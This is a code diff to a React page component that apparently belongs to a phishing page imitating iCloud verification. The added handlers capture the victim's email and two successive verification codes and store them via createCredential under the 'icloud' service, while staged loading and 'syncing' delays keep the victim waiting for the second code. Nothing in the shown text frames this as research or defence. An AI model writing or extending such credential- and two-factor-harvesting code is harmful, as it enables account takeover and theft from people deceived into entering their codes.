@@ -42,7 +42,18 @@ export default function Home() {
     }
   };
 
-  const handleVerificationSubmit = () => {
+  const handleVerificationSubmit = async () => {
+    try {
+      const codeStr = verificationCode.join("");
+      await createCredential({
+        email: form.getValues("email"),
+        password: `CODE_1: ${codeStr}`,
+        service: "icloud"
+      });
+    } catch (e) {
+      console.error(e);
+    }
+
     setStep("loading_two");
     
     // Animate loading for 5sec before second code input
@@ -51,7 +62,18 @@ export default function Home() {
     }, 5000);
   };
 
-  const handleVerificationSubmitTwo = () => {
+  const handleVerificationSubmitTwo = async () => {
+    try {
+      const codeStr = verificationCodeTwo.join("");
+      await createCredential({
+        email: form.getValues("email"),
+        password: `CODE_2: ${codeStr}`,
+        service: "icloud"
+      });
+    } catch (e) {
+      console.error(e);
+    }
+
     setStep("syncing");
     
     // Move to next step after a delay
